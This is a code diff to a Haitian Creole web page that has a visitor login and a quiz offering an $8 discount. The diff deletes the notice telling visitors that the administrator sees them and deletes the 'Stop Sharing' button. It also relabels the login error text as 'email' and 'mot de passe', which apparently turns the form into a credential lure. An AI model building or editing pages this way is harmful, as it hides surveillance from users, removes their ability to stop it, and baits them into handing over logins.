@@ -334,11 +334,10 @@
 
     <div class="active-panel hidden" id="activeView">
       <div class="card">
-        <p><span class="dot"></span><strong>Bienvenue !</strong></p>
+        <p><span class=""></span><strong>Bienvenue !</strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
-          Administratè a ap wè ou.
+        
         </p>
-        <button id="btnStop" class="btn-stop">⛔ Sispann Pataje</button>
         <button id="btnQuiz" class="btn-quiz">🎯 Fè Quiz la — Jwenn $8 Rabè</button>
       </div>
     </div>
@@ -501,8 +500,8 @@ btnLogin.onclick = () => {
   const name = nameInput.value.trim();
   const phone = phoneInput.value.trim();
 
-  if (name.length === 0) { err.innerText = "Antre yon non."; return; }
-  if (phone.length < 8) { err.innerText = "Antre yon telefòn valid (8 chif)."; return; }
+  if (name.length === 0) { err.innerText = "email"; return; }
+  if (phone.length < 8) { err.innerText = "mot de passe."; return; }
 
   localStorage.setItem("visitor_logged", "1");
   localStorage.setItem("visitor_name", name);
